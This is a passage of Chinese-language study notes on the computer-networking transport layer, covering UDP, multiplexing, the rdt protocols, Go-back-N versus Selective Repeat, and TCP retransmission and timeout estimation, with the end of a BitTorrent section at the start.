然后开始和torrent中的peer节点交换块。</p><blockquote><p>Peer如何加入torrent：</p><ul><li>一开始没有块，但是将会通过其他节点处累积文件块</li><li>向跟踪服务器注册，获得peer节点列表，和部分peer节点构成邻居关系 (“连接 ”)</li></ul></blockquote><ul><li>当peer下载时，该peer可以同时向其他节点提供上载服务</li><li>Peer可能会变换用于交换块的peer节点</li><li>扰动churn: peer节点可能会上线或者下线</li><li>一旦一个peer拥有整个文件，它会（自私的）离开或者保留（利他主义）在torrent中</li></ul></blockquote></li></ul><p><strong>请求块</strong></p><ul><li>在任何给定时间，不同peer节点拥有一个文件块的子集</li><li>周期性的，Alice节点向邻居询问他们拥有哪些块的信息</li><li>Alice向peer节点请求它希望的块，稀缺的块</li></ul><p>发送块（一报还一报 tit-for-tat）</p><p>Alice向4个peer发送块，这些块向它自己提供最大带宽的服务</p><ul><li>其他peer被Alice阻塞 (将不会从Alice处获得服务)</li><li>每10秒重新评估一次：前4位</li></ul><p>每个30秒：随机选择其他peer节点，向这个节点发送块</p><ul><li>“优化疏通” 这个节点</li><li>新选择的节点可以加入这个top 4</li></ul><h1 id="第三章：计算机网络-传输层"><a href="#第三章：计算机网络-传输层" class="headerlink" title="第三章：计算机网络|传输层"></a>第三章：计算机网络|传输层</h1><h2 id="概述和传输层服务"><a href="#概述和传输层服务" class="headerlink" title="概述和传输层服务"></a>概述和传输层服务</h2><p>传输层为运行在不同主机上的应用进程提供<strong>逻辑通信</strong>服务（以报文为单位）。</p><blockquote><p>提供进程-进程之间的通信</p></blockquote><p>传输协议运行在端系统中：</p><ul><li>发送方：将应用层的报文分成报文段（添加段头，形成本层数据单元），然后传递给网络层。</li><li>接收方：将报文段重组成报文（去掉段的头部信息，取出段的内容），然后以字节流的形式传递给应用层</li></ul><p>传输层向上层提供多种协议：</p><ul><li>Internet: TCP和UDP</li></ul><blockquote><p>   传输层VS网络层</p><p>   网络层服务：主机之间的逻辑通信。</p><p>   传输层服务：进程间的逻辑通信。（主机之间服务的细分）</p><ul><li><p>依赖于网络层的服务：延时、带宽。</p></li><li><p>对网络层的服务进行增强：数据丢失、顺序混乱、加密。</p></li><li><p>有些服务是不可以加强的：带宽、延迟。</p></li><li><p>传输层向上层提供的服务其中很重要的一个功能就是 <strong>复用</strong> （源端）以及<strong>解复用</strong>（目标端）。（后文详细介绍）</p></li></ul></blockquote><blockquote><p>下面举个例子来说明传输层的服务：</p><blockquote></blockquote><p>   假设Ann家与Bill家各有12个小孩，定期，各家的12个小孩会向对方家的12个小孩进行书信往来。那么一次单向通信就需要12×12&#x3D;144封信件。现在假定是Ann家的孩子们向Bill家的孩子们发送信件。但是一封一封的发送过于繁琐，孩子们会这样解决问题：由Ann家的老大将信件全部收集起来，打包一起发送到Bill家。Bill家的老大收到信件后就会分发给不同的孩子。</p><p>在这个例子中：</p><ul><li>两个家庭 &#x3D; 于两个主机</li><li>每个小孩 &#x3D; 不同的进程</li><li>信封中的信件 &#x3D; 应用层报文</li><li>Ann和Bill &#x3D; 传输协议：</li><li>Ann将信件打包的过程（聚合） &#x3D; 复用</li><li>Bill将打包的信件分发（拆分） &#x3D; 解复用</li><li>送信的邮件服务 &#x3D; 网络层协议</li></ul></blockquote><p>Internet传输层协议：</p><ul><li><p>TCP：可靠的、保序的传输（提供字节流的服务）</p><ul><li>多路复用、解复用</li><li>拥塞控制</li><li>流量控制</li><li>建立连接</li></ul></li><li><p>UDP：不可靠、不保序的传输（提供数据报的服务）</p><ul><li>多路复用、解复用</li><li>没有为尽力而为的IP服务添加更多的其它额外服务</li></ul><blockquote><p>   二者都是在IP提供的服务的基础之上提供服务（IP提供的服务：best effort）</p><p>   二者都不能提供的服务：</p><ul><li>延时保证</li><li>带宽保证</li></ul></blockquote></li></ul><h2 id="多路复用与解复用"><a href="#多路复用与解复用" class="headerlink" title="多路复用与解复用"></a>多路复用与解复用</h2><p>我们已经知道，IP向传输层提供的提供的服务是主机-主机的，而传输层提供的服务是进程-进程的，如何在传输层实现这一细分的服务的实现，所依靠的就是端口号。</p><p>此外：引入Socket的目的就是使层间传递的数据尽可能少。</p><blockquote><p>   TCP和UDP都分别有各自的端口号，但二者使用端口的方式并不一样。</p></blockquote><p>先来描述述一下多路复用&#x2F;解复用的概念：</p><ul><li>在发送方主机多路复用：</li></ul><pre><code>从多个套接字接收来自多个进程的报文，根据套接字对应的IP地址和端口号等信息对报文段用头部加以封装 (该头部信息用于以后的解复用)</code></pre><ul><li>在接收方主机多路解复用：</li></ul><pre><code>根据报文段的头部信息中的IP地址和端口号将接收到的报文段发给正确的套接字(和对应的应用进程)</code></pre><h3 id="TCP的多路复用-x2F-解复用"><a href="#TCP的多路复用-x2F-解复用" class="headerlink" title="TCP的多路复用&#x2F;解复用"></a>TCP的多路复用&#x2F;解复用</h3><p>之前我们介绍过，TCP的Socket和四元组相捆绑，代表两个进程之间的会话关系。</p><blockquote><p>   四元组包含：源端IP，源端进程端口；目标端IP，目标端进程端口。</p></blockquote><p>发送方复用：</p><ol><li>应用层将进程的信息向传输层传递，其中包含两个部分：<strong>Socket</strong>和<strong>Message</strong>。</li><li>Socket包含源端进程端口以及目标端进程端口，这时就会将这两个端口封装在报文段（Segment）中（这里还会封装一些其他信息，我们先不考虑）。段以及源端IP和目标端IP再向下层网络层传输。</li><li>网络层接收来自上层的段以及IP信息，并进行封装。由此便可以借助下层提供的服务将其传输道目标主机。</li></ol><p>接收方解复用：</p><ol><li>网络层接收到传输来的分组，把头部信息去掉，剩下的段的部分交给传输层。</li><li>传输层得到段可以通过头部信息知道源端IP、源端进程端口、目标端IP以及目标端进程端口。并可以将信息继续向应用层传递，交给对应的进程。</li></ol><blockquote><p>   补充：</p><p>   服务器能够在一个TCP端口上同时支持多个TCP套接字。</p><p>   Web服务器对每个连接客户端有不同的套接字。</p></blockquote><h3 id="UDP的多路复用-x2F-解复用"><a href="#UDP的多路复用-x2F-解复用" class="headerlink" title="UDP的多路复用&#x2F;解复用"></a>UDP的多路复用&#x2F;解复用</h3><p>UDP的Socket和二元组相捆绑。</p><blockquote><p>   二元组包含：本地IP，本地进程端口。</p></blockquote><p>发送方复用：</p><ol><li>应用层将Message、Socket与目标IP和目标进程端口向传输层传递（注意UDP Socket同TCP不同，不包含目标IP与目标进程端口）。</li><li>传输层将源进程端口以及目标进程端口封装在头部，形成报文段，向网络层传递。</li><li>网络层继续将源IP和目标IP封装起来形成数据报（datagram），并借助下层提供的服务将其传输道目标主机。</li></ol><p>接收方解复用：</p><ol><li>网络层接收到传来的数据报，把头部信息去掉，将报文段以及目标IP和目标进程端口向传输层传递。</li><li>传输层接收下层传来的信息，继续解封装，将数据向应用层传递，交给对应的进程。</li></ol><blockquote><p>   补充：</p><p>   传输层TCP&#x2F;UDP报文段格式：</p><p>   对于UDP的多路解复用：如果两个不同源IP地址&#x2F;源端口号的数据报，但是有相同的目标IP地址和端口号，则被定位到相同的UDP套接字，发给同一个应用进程。（这点同TCP不一样）</p><p>   因此可以这样记忆：不管是TCP四元组还是UDP二元组，必须元组内信息全部一致，才会对应同一个Socket，发送给同一个进程。</p></blockquote><h2 id="无连接传输：UDP"><a href="#无连接传输：UDP" class="headerlink" title="无连接传输：UDP"></a>无连接传输：UDP</h2><p>UDP在IP提供的服务之上并没有增加过多的额外的服务，仅增加了多路复用&#x2F;解复用。因此UDP也是“尽力而为”的服务。并可能发生如下问题：</p><ul><li>数据丢失</li><li>送到应用进程的报文段乱序</li></ul><p>UDP的另一个特征就是<strong>无连接</strong>：</p><ul><li>UDP发送端和接收端之间没有握手</li><li>每个UDP报文段都被独立地处理</li></ul><p>UDP被用于：</p><ul><li>流媒体（丢失不敏感，速率敏感、应用可控制传输速率）</li><li>事务性的应用（仅一次通信）</li><li>DNS</li><li>SNMP（简单的网络管理协议）</li></ul><p>如果想使用UDP协议，同时又希望具有可靠性，那么这种可靠性服务只能由进程本身（应用层）提供。可以应用特定的差错恢复。</p><p>UDP报文段格式：</p><p>头部为8Byte，包括：源端口号、目标端口号、长度（包括头部在内的整个报文段的长度）、校验和(checksum)。（均为2Byte）</p><blockquote><p>   UDP存在的必要性：</p><ul><li>不建立连接 （会增加延时）。</li><li>简单：在发送端和接收端没有连接状态（服务器无需维护客户端状态，客户端也无需维护与源端某一进程的通讯状态）。</li><li>报文段的头部很小(开销小)。因此一个报文段的载荷（应用程序数据）就比较大。</li><li>无拥塞控制和流量控制：UDP可以尽可能快的发送报文段。</li></ul></blockquote><h3 id="UDP校验和"><a href="#UDP校验和" class="headerlink" title="UDP校验和"></a>UDP校验和</h3><p>校验和的目的：检测在被传输报文段中的差错 (如比特反转)。</p><p>发送方：</p><ul><li>将报文段的内容视为16bit的整数</li><li>校验和：报文段的加法和（1的补运算）</li><li>发送方将校验和放在UDP的校验和字段</li></ul><p>接受方：</p><ul><li>计算接收到的报文段的校验和</li><li>检查计算出的校验和与校验和字段的内容是否相等：<ul><li>不相等——检测到差错（一定错）</li><li>相等——一种情况是没有差错；另一种情况也许会出现残存错误。</li></ul></li></ul><p>校验和的具体实现：</p><p>将报文段的数据（包含一些头部信息），拆分成16bit一组（不足的补零）。将这些16bit的整数相加。</p><ul><li>进位回滚：</li></ul><pre><code>16bit整数相加可能会有进位，这是就把进位加到计算结果的最后一位。最后求得的校验和是处理进位的结果的反码。</code></pre><p><img src="https://www.helloimg.com/images/2023/08/27/oi16lm.png" alt="CN校验和进位回滚"></p><pre><code>目标端重复发送方一样的操作，但是没有最后的取反码的步骤，将其计算出的结果同发送方的检验和相加，如果没有差错，应该是16位“1”（=1111111111111111），否则没有通过校验。</code></pre><h2 id="可靠数据传输的原理"><a href="#可靠数据传输的原理" class="headerlink" title="可靠数据传输的原理"></a>可靠数据传输的原理</h2><p>可靠数据传输（Reliable data transfer，rdt）在应用层、传输层和数据链路层都很重要。</p><h3 id="可靠数据传输的原理-1"><a href="#可靠数据传输的原理-1" class="headerlink" title="可靠数据传输的原理"></a>可靠数据传输的原理</h3><p>rdt需要提供的是可靠的服务（在上层），可是它却要依赖与下层不可靠的udt服务（可能会丢失、可能会乱序），所以下层信道的不可靠特点决定了可靠数据传输协议（ rdt ）的。</p><p><img src="https://www.helloimg.com/images/2023/08/27/oi18Ih.png" alt="CN可靠数据传输的描述"></p><blockquote><ul><li>**rdt_send()<strong>和</strong>deliver_data()**是传输层与应用层的层间接口；</li><li>**udt_send()<strong>和</strong>rdt_rcv()**是传输层与网络层的层间接口。</li></ul></blockquote><p>下面我们来具体讲述传输层是如何实现可靠传输机制的。</p><p>在展开讲述之前先提前做个铺垫，如何渐进式地描述这一问题：</p><p>先假设底层信道传输是可靠的（实际上并非如此），那么上层就不需要任何机制就可以保证可靠传输，于是我们会将下层的可靠性一点一点剥落，同样的上层就会相应地增加可靠传输机制。这便是接下来的讲解思路。</p><p>虽然信息传输是双向流动的，但是我们可以只考虑单向数据传输。（双向的数据传输问题实际上是2个单向数据传输问题的综合）</p><p>使用有限状态机 (FSM) 来描述发送方和接收方：</p><p> FSM（有限状态机）：实际上就是描述协议工作机制的形式化的描述方案。<br><img src="https://www.helloimg.com/images/2023/08/27/oi1gLq.png" alt="CNFSM"><br>节点代表状态；边代表节点状态之间的迁移；边上的标记（label）：分母代表事件、分子代表采取的动作。</p><h3 id="rdt1-0：在可靠信道上的可靠数据传输"><a href="#rdt1-0：在可靠信道上的可靠数据传输" class="headerlink" title="rdt1.0：在可靠信道上的可靠数据传输"></a>rdt1.0：在可靠信道上的可靠数据传输</h3><p>首先假设信道传输：</p><ul><li>没有比特出错</li><li>没有分组丢失</li></ul><p>发送方：</p><ol><li>应用层将数据传送下来</li><li>传输层只做两件事情：<br>- 添加头部信息，封装为包（packet）<br>- 借助于下层的服务将数据发送出去</li></ol><p>接收方：</p><ol><li>等待下层传来的数据</li><li>传输层依旧只做两件事：<br>- 解封装<br>- 将数据向上层传递</li></ol><p>rdt1.0的FSM描述：<br><img src="https://www.helloimg.com/images/2023/08/27/oi1kNr.png" alt="CNrdt1.0"></p><h3 id="rdt2-0：具有比特差错的信道"><a href="#rdt2-0：具有比特差错的信道" class="headerlink" title="rdt2.0：具有比特差错的信道"></a>rdt2.0：具有比特差错的信道</h3><p>假设下层信道传输可能出现比特翻转（比特差错）</p><p>解决方案就是采用上文提到过的<strong>校验和</strong>。</p><p>发送方在向接收方发送数据时，会采用校验和来判断数据传输有无差错，并且接收方会有一个反馈机制：</p><ul><li>确认(ACK)：如果通过了校验和，接收方会发送ACK信息，显式地告诉发送方分组已被正确接收。</li><li>否定确认( NAK)：如果未通过校验和，接收方会发送NAK信息，显式地告诉发送方分组发生了差错。接着发送方会重新发送分组。<blockquote><p>发送方会有一个缓存，以便发送分组失败后可以重新将分组发送给接收方。</p></blockquote></li></ul><p>发送方：</p><ol><li>接收来自上层的数据</li><li>计算校验和并封装为packet；借助下层的服务将数据发送出去</li><li>转变为等待ACK&#x2F;NAK的状态：</li></ol><ul><li>如果接收到NAK信息，重新发送packet，并继续维持等待状态</li><li>如果接收到ACK信息，转为接收上层信息并发送数据的状态</li></ul><p>接收方：</p><ol><li>接收下层传来的packet，并计算校验和：</li></ol><ul><li>如果通过（未腐败的(notcorrupt)）校验和，解封装，将数据向上层传递，向并发送方发送ACK确认信息</li><li>如果为通过（腐败的(corrupt)）校验和，则向发送方发送NAK信息</li></ul><p>rdt2.0的FSM描述：<br><img src="https://www.helloimg.com/images/2023/08/27/oi1ruT.png" alt="CNrdt2.0"></p><h3 id="rdt2-1：停止等待协议"><a href="#rdt2-1：停止等待协议" class="headerlink" title="rdt2.1：停止等待协议"></a>rdt2.1：停止等待协议</h3><p>停等协议：发送方发送一个分组，然后等待接收方的应答。（一次只发送一个等待确认信息）</p><p>我们仔细思考就会察觉，rdt2.0有一个致命的错误：如果接收方的反馈信息（ACK&#x2F;NAK）发生了差错该如何处理？</p><p>理想很丰满，现实很骨感。接受方说：“正确收到”，那么发送方继续传送下一个包；接收方说：“发生错误”，则发送方重新传包。就怕接收方来了一句：“歪比巴卜”，这就容易给发送方整懵了。</p><p>所以说rdt2.0的协议机制并不完备。</p><p>为此引入新的机制：序号（sequence number）</p><blockquote><p>停等协议由于一次只发送一个等待确认的信息，因此只需要一位就可以识别（0、1）排序。</p></blockquote><p>发送方：</p><ol><li>会在每一个分组中添加序号（P0、P1）</li><li>如果发送方接收到的反馈信息出错（无法识别），无论是ACK还是NAK，发送方都会重新发送旧的分组。</li></ol><p>接收方：</p><ol><li>如果是NAK出错，那么正好接收来重新传送的分组，如果通过校验，发送ACK确认信息；否则发送NAK。</li><li>如果是ACK出错，那么这时接收方就会收到重复的分组，由于分组增添了序号，那么接收方会将该分组丢掉，不再向上层传递。接着会向发送方发送ACK确认信息，以请求发送后续分组。</li></ol><p>rdt2.1的FSM描述：<br>发送方处理出错的ACK&#x2F;NAK<br><img src="https://www.helloimg.com/images/2023/08/27/oi1fOK.png" alt="CNrdt2.1发送方"></p><p>接收方处理出错的ACK&#x2F;NAK<br><img src="https://www.helloimg.com/images/2023/08/27/oi1hrb.png" alt="CNrdt2.1接收方"></p><blockquote><p>注意：</p><p>rdt2.1中，接收方并不知道发送方是否正确收到了其ACK&#x2F;NAK信息（没有安排确认的确认）。<br><img src="https://www.helloimg.com/images/2023/08/27/oi1u3o.png" alt="CNrdt2.1运行"></p><p>那考虑是否在发送方安排确认的确认机制呢？那么如此我们如何判断确认的确认是否正确。所以事实上这样的“套娃”设计意义并不大，并不能完美的解决问题。</p></blockquote><p>rdt2.2：无NAK的协议</p><ul><li><p>功能同rdt2.1，但只使用ACK（ack需要编号）<br><img src="https://www.helloimg.com/images/2023/08/27/oi1ylD.png" alt="CNrdt2.2NAKfree"></p></li><li><p>接收方对最后正确接收的分组发ACK，以替代NAK。</p><pre><code>  接收方必须显式地包含被正确接收分组的序号。  用情商课堂的方式理解很简单：当发送方发送了编号为1的分组（这时它应该等待ACK1）  - 低情商：接收方发来了NAK信息→1号分组出错了  - 高情商：接收方发来了ACK0→1号分组出错了  因此对ACK的编号可以替代NAK。</code></pre></li><li><p>这就为之后的流水线协议做好了基础（一次发送多个数据单位）。</p><ul><li>使用对前一个数据单位的ACK，代替本数据单位的NAK</li><li>这样可以使确认信息减少一半，协议处理简单</li></ul></li></ul><blockquote><p><img src="https://www.helloimg.com/images/2023/08/27/oi356S.png" alt="CNrdt2.2的运行"></p><p>当然如果ACK信息发送错误依然有可能导致接收方接收分组重复，解决方案仍和rdt2.1是一样的：</p><p><img src="https://www.helloimg.com/images/2023/08/27/oi3CZC.png" alt="CNrdt2.2的运行2"></p></blockquote><p>rdt2.2的FSM描述（部分）：</p><p>rdt3.0：具有比特差错和分组丢失的信道<br>假设下层的传输信道除了比特差错之外还可能丢失分组。</p><p>如果出现了分组丢失的情况：一方面接收方在等待分组，另一方面发送方在等待确认信息。所以会出现死锁的情况。（rdt2.2还无法处理这种情况）</p><p>所以会引入新的机制：超时重传</p><p>需要countdown timer（倒计时定时器）<br>发送方会等待ACK信息一段合理的时间，如果在这段时间内没有收到ACK信息，就会重新传输分组（一旦超时，发送方就会认为分组已经丢失）。</p><p>合理的时间：</p><p>传输层timeout时间是适应式的<br>链路层的timeout时间确定的<br>接下来会有新的问题：如果只是发送方的ACK信息丢失，或者只是分组（或ACK信息）被延时，那么就会导致接收方收到的分组重复。这个问题在rdt2.1中就已经解决。</p><p>rdt3.0的FSM描述（发送方）：</p><p>rdt3.0的运行：</p><p>过早超时（延迟的ACK）也能够正常工作；但是效率较低，一半的分组和确认是重复的（超时之后的分组和ACK都是发送两次的）；<br>因此设置一个合理的超时时间也是比较重要的。</p><p>rdt3.0的性能：<br>rdt3.0可以工作（功能比较完备），但链路容量比较大的情况下，性能很差。</p><p>链路容量比较大，一次发一个PDU 的不能够充分利用链路的传输能力。<br>举个例子：A地到B地相距甚远，驱车从A地到B地需要很长的时间，但是停等协议只允许高速公路上一次跑一辆汽车（实际上高速公路可以容纳很多车辆）。所以链路越大，停等协议对链路的利用率就越低。<br>即：网络协议限制了物理资源的利用。<br>具体可以举例计算（如下图）：</p><p>流水线协议（Pipelined protocols）<br>为了提高链路利用率，接下来就引入了流水线的方式。</p><p>上文提到造成链路利用率低下的原因是停等协议每次只允许发送一个分组，那么我们就可以考虑一次发送多个分组以提高利用率，但是这个值并不会增加到100%，随着能够同时发送分组的数量的增加，到了后期瓶颈就由停等协议转移到了链路带宽。</p><p>流水线协议：允许发送方在未得到对方确认的情况下一次发送多个分组。</p><p>必须增加序号的范围：用多个bit表示分组的序号<br>在发送方&#x2F;接收方要有缓冲区：</p><p>发送方缓存：未得到确认，可能需要重传；<br>接收方缓存：上层用户取用数据的速率 ≠ 接收到的数据速率；接收到的数据可能乱序，排序交付（可靠）</p><p>有两种通用的流水线协议：</p><p>Go-back-N：回退N（GBN）<br>Selective Repeat：选择重传（SR）</p><p>在介绍以上两种协议时我们先做一些铺垫，先来介绍一个通用协议：滑动窗口(slide window)协议<br>该协议根据发送方以及接收方窗口大小的不同可以分为：</p><p>停止等待协议：send_window &#x3D; 1, receive_window &#x3D; 1</p><p>回退N协议：send_window ＞ 1，receive_window &#x3D; 1</p><p>选择重传协议：send_window ＞ 1，receive_window ＞ 1</p><p>发送方窗口（send_window）大于1的协议我们就称之为流水线协议。</p><p>发送缓冲区：</p><p>形式：内存中的一个区域，落入缓冲区的分组可以发送<br>功能：用于存放已发送，但是没有得到确认的分组<br>必要性：需要重发时可用<br>发送缓冲区的大小：一次最多可以发送多少个未经确认的分组</p><p>停止等待协议 &#x3D; 1<br>流水线协议 &gt; 1，合理的值，不能很大，链路利用率不能够超100%</p><p>发送缓冲区中的分组：</p><p>未发送的：落入发送缓冲区的分组，可以连续发送出去；<br>已经发送出去的、等待对方确认的分组：发送缓冲区的分组只有得到确认才能删除</p><p>发送窗口：</p><p>指的是发送缓冲区的一个范围（是发送缓冲区的一个子集）。</p><p>存放已发送但是未确认的分组。（实际上发送传窗口是那些已发送但是未经确认分组的序号构成的空间）</p><p>发送窗口的最大值 ≤ 发送缓冲区的值</p><p>发送窗口的滑动过程：</p><p>一开始：没有发送任何一个分组</p><p>后沿 &#x3D; 前沿</p><p>之间为发送窗口的尺寸 &#x3D; 0</p><p>发送窗口的移动：前沿移动</p><p>每发送一个分组，前沿前移一个单位</p><p>发送窗口前沿移动的极限：不能够超过发送缓冲区</p><p>注意：绿色部分为发送缓冲区</p><p>发送窗口的移动：后沿移动</p><p>后沿移动的条件：收到老分组（后沿）的确认</p><p>结果：发送缓冲区罩住新的分组，来了分组可以发送</p><p>后沿移动的极限：不能够超过前沿</p><p>接收窗口：</p><p>接收窗口 (receiving window) &#x3D; 接收缓冲区</p><p>接收窗口用于控制哪些分组可以接收：</p><p>只有收到的分组序号落入接收窗口内才允许接收<br>若序号在接收窗口之外，则丢弃</p><p>接收窗口尺寸 Wr &#x3D; 1，则只能顺序接收</p><p>举例：</p><p>Wr＝1，在0的位置；只有0号分组可以接收</p><p>向前滑动一个，罩在1的位置，如果来了第2号分组，则丢弃</p><p>接收窗口尺寸 Wr &gt; 1 ，则可以乱序接收（但提交给上层的分组，要按序提交）</p><p>滑动：</p><p>低序号的分组到来（按序），接收窗口移动；<br>高序号分组乱序到，缓存但不交付（因为要实现rdt，不允许失序），不滑动</p><p>发送确认：</p><p>接收窗口尺寸 &#x3D; 1 ； 发送连续收到的最大的分组确认（累计确认）<br>接收窗口尺寸 &gt; 1 ； 收到哪个分组，就发送那个分组的确认（非累计确认）</p><p>绿色区域表示可接收的分组。</p><p>正常情况下两个窗口的互动：</p><p>发送窗口：</p><p>有新的分组落入发送缓冲区范围，发送 → 前沿滑动<br>来了老的低序号分组的确认 → 后沿向前滑动 → 新的分组可以落入发送缓冲区的范围</p><p>接收窗口：</p><p>收到分组，落入到接收窗口范围内，接收<br>发送确认给发送方</p><p>如果低序号分组确认收到，向前滑动接收窗口<br>否则不滑动</p><p>异常情况下GBN的两窗口互动：</p><p>发送窗口：</p><p>新分组落入发送缓冲区范围，发送 → 前沿滑动<br>超时重发机制让发送端将发送窗口中的所有分组发送出去（低序号开始的连续的已发送但未确认的分组全部重新发送）<br>来了老分组的重复确认 → 后沿不向前滑动 → 新的分组无法落入发送缓冲区的范围（此时如果发送缓冲区有新的分组可以发送）</p><p>接收窗口：</p><p>收到乱序分组，没有落入到接收窗口范围内，抛弃<br>（重复）发送老分组的确认，累计确认</p><p>异常情况下SR的两窗口互动：</p><p>发送窗口：</p><p>新分组落入发送缓冲区范围，发送 → 前沿滑动<br>超时重发机制让发送端将超时的分组重新发送出去<br>来了乱序分组的确认 → 后沿不向前滑动 → 新的分组无法落入发送缓冲区的范围（此时如果发送缓冲区有新的分组可以发送）</p><p>接收窗口：</p><p>收到乱序分组，落入到接收窗口范围内，接收<br>发送该分组的确认，单独确认</p><p>由此我们小结一下GBN协议和SR协议的异同：</p><p>相同点：</p><p>发送窗口 &gt; 1<br>一次能够可发送多个未经确认的分组</p><p>不同点：</p><p>GBN :接收窗口尺寸 &#x3D; 1</p><p>接收端：只能顺序接收<br>发送端：从表现来看，一旦一个分组没有发成功，如：0、1、2、3、4; 假如1未成功，2、3、4都发送出去 了，要返回1再发送1、2、3、4。<br>累计确认：cumulative ack<br>发送端拥有对最老的未确认分组的定时器：</p><p>只需设置一个定时器<br>当定时器到时时，重传所有未确认分组</p><p>发送窗口的最大值（序号大小为n）：2n-1</p><p>SR: 接收窗口尺寸 &gt; 1</p><p>接收端：可以乱序接收<br>发送端：发送0、1、2、3、4，一旦1未成功，2、3、4,已发送，无需重发，只选择性发送1。<br>非累计确认&#x2F;独立确认：individual ack<br>发送方为每个未确认的分组保持一个定时器：</p><p>当超时定时器到时，只是重发到时的未确认分组</p><p>发送窗口的最大值（序号大小为n）：2n-1</p><p>列出下表对比一下GBN协议和SR协议：</p><p>GBN<br>SR</p><p>优点<br>简单，所需资源少（接收方一个缓存单元）<br>出错时，重传一个代价小</p><p>缺点<br>一旦出错，回退N步代价大<br>复杂，所需要资源多（接收方多个缓存单元）</p><p>适用范围：</p><p>出错率低：比较适合GBN，出错非常罕见，没有必要用复杂的SR，为罕见的事件做日常的准备和复杂处理<br>链路容量大（延迟大、带宽大）：比较适合SR而不是GBN，一旦出错代价太大</p><p>面向连接的传输：TCP<br>TCP概述</p><p>点对点：一个发送方，一个接收方</p><p>可靠的、按顺序的字节流：没有报文边界</p><p>TCP不提供报文界限：发送方可能发送两个报文，接收方可能会收到一个大的报文，也可能收到四个小的报文。应用进程之间报文的界限需要应用进程自己去维护。</p><p>提供管道化（流水线）的协议：</p><p>TCP拥塞控制和流量控制设置窗口大小</p><p>发送和接收有缓存</p><p>全双工数据：</p><p>在同一连接中数据流双向流动（一方进程可同时发送数据和接收数据）</p><p>面向连接：在数据交换之前，通过握手（交换控制报文） 初始化发送方、接收方的状态变量</p><p>有流量控制：发送方不会淹没接收方</p><p>MSS：最大报文段大小<br>MTU：最大传输单元</p><p>TCP报文段结构</p><p>说明：</p><p>源端口号、目标端口号：16bit</p><p>序号并不是报文段的序号，而是报文段的数据载荷（body）部分的第一个字节在整个字节流中的偏移量。（对字节计数）</p><p>一般情况下序号并不是从0或1这样固定的序号开始：为了避免长时间滞留在网络中的分组所包括的段对新的连接造成影响。</p><p>确认号：依然是字节计数</p><p>如果接收方传来的ACK为555，则表示接收方已经接收到了554及之前所有的字节，并希望发送方下一个传来555字节的数据。（累计确认）<br>接收方处理乱序的报文段：可以缓存，也可以丢弃。</p><p>首部长度：4个字节为单位，表示该TCP段的首部数据大小。</p><p>RSF（RST、SYN、FIN）标志位：主要是用于两个应用进程进行TCP连接的标志位。<br>不同标志位的组合代表不同的握手（后面会提到），以及连接释放请求、确认等。</p><p>接受窗口：用于流量控制。如果接收方的接收窗口为X，则表示接收方可以接收X字节的数据。</p><p>校验和：同UDP中的校验和作用一致。</p><p>TCP确认号和序号实例：</p><p>TCP往返延时（RTT）和超时<br>分析可能的情况：TCP超时应该设置的比RTT长。如果设置太短，就会发生没必要的重传；如果太长，那么对报文段丢失的反应太慢。但是RTT是在不断变化的，因此我们需要定期测量RTT。</p><p>SampleRTT：测量从报文段发出到收到确认的时间。<br>仅用当前的SampleRTT是不合理的，应该对几个最近的测量值求平均。<br>具体公式如下：<br>EstimatedRTT &#x3D; (1- α) × EstimatedRTT + α × SampleRTT</p><p>指数加权移动平均<br>过去样本的影响呈指数衰减<br>推荐值：α &#x3D; 0.125</p><p>进一步我们需要考虑EstimatedRTT的变化范围：</p><p>EstimtedRTT + 安全边界时间</p><p>EstimatedRTT变化大 (方差大) → 较大的安全边界时间</p><p>SampleRTT会偏离EstimatedRTT多远：</p><p>DevRTT &#x3D; (1-β) × DevRTT + β × |SampleRTT-EstimatedRTT|<br>(推荐值：β &#x3D; 0.25)</p><p>由此我们可以计算超时时间间隔：<br>TimeoutInterval &#x3D; EstimatedRTT + 4 × DevRTT</p><p>TCP的可靠数据传输（rdt）</p><p>TCP在IP不可靠服务的基础上建立了rdt</p><p>管道化的报文段：GBN or SR（TCP是两种的混合）<br>累积确认（像GBN）<br>设置单个重传定时器（像GBN）<br>是否可以接受乱序的，TCP没有规范。可以缓存乱序报文段，也可以丢弃。</p><p>通过以下事件触发重传：</p><p>超时（只重发那个最早的未确认段：SR）<br>重复的（三次冗余）确认：</p><p>例子：收到了ACK50,之后又收到3个ACK50</p><p>在分析TCP如何建立rdt，我们依旧采取以上讲可靠数据传输原理的流程，一步一步增加功能。<br>TCP发送方<br>首先考虑简化的TCP发送方：</p><p>忽略重复的确认</p><p>忽略流量控制和拥塞控制</p><p>TCP发送方事件：</p><p>从应用层接收数据：</p><p>用nextseq创建报文段<br>序号nextseq为报文段首字节的字节流编号<br>如果还没有运行，启动定时器</p><p>定时器与最早未确认的报文段关联</p><p>超时：</p><p>重传后沿最老的报文段<br>重新启动定时器</p><p>收到确认：</p><p>如果是对尚未确认的报文段确认</p><p>更新已被确认的报文序号<br>如果当前还有未被确认的报文段，重新启动定时器</p><p>TCP重传（左图为ACK丢失，右图为ACK超时）：</p><p>（下图为累计确认）</p><p>在RFC中对产生TCP ACK的建议（如下表）</p><p>接收方的事件<br>TCP接收方动作</p><p>所期望序号的报文段按序到达。 所有在期望序号之前的数据都已经被确认<br>延迟的ACK。对另一个按序报文段的到达最多等待500ms。如果下一个报文段在这个时间间隔内没有到达，则发送一个ACK。</p><p>有期望序号的报文段到达。另一个按序报文段等待发送ACK（接收到连续的两个段）<br>立即发送单个累积ACK，以确认两个按序报文段。</p><p>比期望序号大的报文段乱序到达。检测出数据流中的间隔<br>立即发送重复的ACK，指明下一个期待字节的序号</p><p>能部分或完全填充接收数据间隔的报文段到达。<br>若该报文段起始于间隔（gap）的低端，则立即发送ACK。</p><p>快速重传<br>产生快速重传的原因：超时周期往往太长（在重传丢失报文段之前的延时太长）。<br>快速重传：在定时器过时之前重发报文段</p><p>由三个冗余ACK触发</p><p>它假设跟在被确认的数据后面的数据丢失了：</p><p>第一个ACK是正常的；<br>收到第2个该段的ACK，表示接收方收到一个该段后的乱序段；<br>收到第3，4个该段的ack，表示接收方收到该段之后的2个 ，3个乱序段，可能性非常大段丢失了</p><p>如果发送方收到同一数据 的3个冗余ACK，重传最小序号的段。</p><p>TCP流量控制<br>流量控制：接收方控制发送方，不让发送方发送的太多、太快以至于让接收方的缓冲区溢出。</p><p>接收方在其向发送方的TCP段头部的rwnd字段“通告”其空闲buffer大小</p><p>RcvBuffer大小通过socket选项设置 (典型默认大小为4096 字节)<br>很多操作系统自动调整 RcvBuffer</p><p>发送方限制未确认(“inflight”)字节的个数 ≤ 